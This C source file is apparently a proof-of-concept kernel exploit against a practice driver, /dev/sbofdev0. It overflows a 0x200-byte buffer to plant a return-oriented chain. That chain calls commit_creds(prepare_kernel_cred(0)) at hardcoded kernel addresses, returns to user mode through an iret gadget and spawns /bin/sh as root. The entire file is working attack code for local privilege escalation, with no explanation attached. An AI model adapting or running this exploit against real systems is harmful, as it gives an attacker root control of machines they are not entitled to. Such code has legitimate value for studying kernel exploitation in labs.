
/*
 * simple_bof.c
 * d0now@pwnsuky
*/

#include <unistd.h>
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <fcntl.h>

#define G_IRET 0xc1011a9a
#define F_COMMIT_CREDS 0xc103ff30
#define F_PREPARE_KERNEL_CRED 0xc1040150

uint32_t user_cs, user_ss, user_eflags, user_esp;

int __attribute__((regparm(3))) (*commit_creds)(int);
int __attribute__((regparm(3))) (*prepare_kernel_cred)(int);

static inline void form_state(void) {
    asm(
        "mov %%cs, %0\n"
        "mov %%ss, %1\n"
        "pushf\n"
        "pop %2\n"
        "mov %%esp, %3\n"
        : "=r" (user_cs), "=r" (user_ss), "=r" (user_eflags), "=r" (user_esp) : : "memory"
    );
}

void priv_esc(void) {
    commit_creds(prepare_kernel_cred(0));
}

void kern_ret_func(void) {
    system("/bin/sh");
    exit(0);
}

int main(void) {

    int fd;
    char buf[0x200];
    uint32_t *rop;

    printf("Start...\n");
    commit_creds        = (int (*)(int))F_COMMIT_CREDS;
    prepare_kernel_cred = (int (*)(int))F_PREPARE_KERNEL_CRED;

    memset(buf, 'A', sizeof(buf));

    form_state();

    rop = (uint32_t *)(&buf[0x10c]);
    *rop++ = (uint32_t)(priv_esc);
    *rop++ = G_IRET;
    *rop++ = (uint32_t)(kern_ret_func);
    *rop++ = user_cs;
    *rop++ = user_eflags;
    *rop++ = user_esp;
    *rop++ = user_ss;

    /* Trigger bof */
    if ((fd = open("/dev/sbofdev0", O_RDWR)) == -1)
        goto err;
    write(fd, buf, 0x200);
    close(fd);

    return 0;
err:
    printf("Error occured.\n");
    return -1;
}